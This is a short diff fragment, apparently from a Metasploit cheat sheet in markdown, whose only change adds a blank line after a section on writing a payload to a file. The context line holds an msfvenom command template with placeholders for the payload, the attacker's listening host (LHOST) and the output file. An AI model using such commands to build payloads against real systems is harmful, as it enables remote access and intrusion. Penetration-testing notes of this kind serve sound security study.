@@ -132,3 +132,4 @@ set LHOST
 ### Write payload into a file
 
     msfvenom -p <payload> LHOST=<host_ip> > <outputfile>
+
